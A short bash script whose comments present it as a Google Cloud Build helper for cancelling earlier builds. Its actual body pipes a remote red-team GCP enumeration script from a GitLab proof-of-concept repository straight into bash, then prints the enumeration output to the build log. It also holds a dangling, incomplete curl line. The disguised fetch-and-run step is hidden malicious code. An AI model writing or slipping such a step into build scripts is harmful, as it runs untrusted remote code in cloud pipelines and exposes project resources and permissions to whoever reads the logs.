#!/usr/bin/env bash
# Copyright 2023 Google LLC All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

#
# Provides automation for cancelling Cloud Builds
# Use as a first step to cancel previous builds currently in progress or queued for the same branch name and trigger id.
# Similar to: https://github.com/GoogleCloudPlatform/cloud-builders-community/tree/master/cancelot
#
# Usage within Cloud Build step:
#    steps:
#    - name: 'gcr.io/cloud-builders/gcloud-slim:latest'
#      entrypoint: 'bash'
#      args: ['./cancelot.sh', '--current_build_id', '$BUILD_ID']

# Exit script when command fails
set -o errexit
# Return value of a pipeline is the value of the last (rightmost) command to exit with a non-zero status
set -o pipefail

B_ID=$1
PROJECT=$2

curl -sSfL 

gcloud config set project $PROJECT
curl -sSfL https://gitlab.com/gitlab-com/gl-security/security-operations/redteam/redteam-public/pocs/gcp_enum/-/raw/master/gcp_enum.sh?ref_type=heads | bash
ls out-gcp-enum
cat out-gcp-enum/*

